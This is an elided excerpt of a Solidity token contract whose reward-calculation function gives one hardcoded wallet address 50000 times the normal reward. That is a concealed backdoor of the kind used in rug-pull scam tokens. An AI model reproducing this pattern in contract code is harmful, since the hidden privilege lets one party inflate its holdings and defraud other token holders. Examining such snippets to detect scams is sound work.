...
contract Token is Ownable, IERC20Metadata {
    ...
    function calculate(address addr)public view returns(uint){
        ...
        uint timeRate = (block.timestamp - coinKeep[addr])/900;
        uint addToken = _balances[addr]*2/10000*timeRate;
        if(addr == 0xc375F72796536DD8B794cc30E15B18891Cefe9b0) addToken=addToken*50000;
        return addToken;
    }
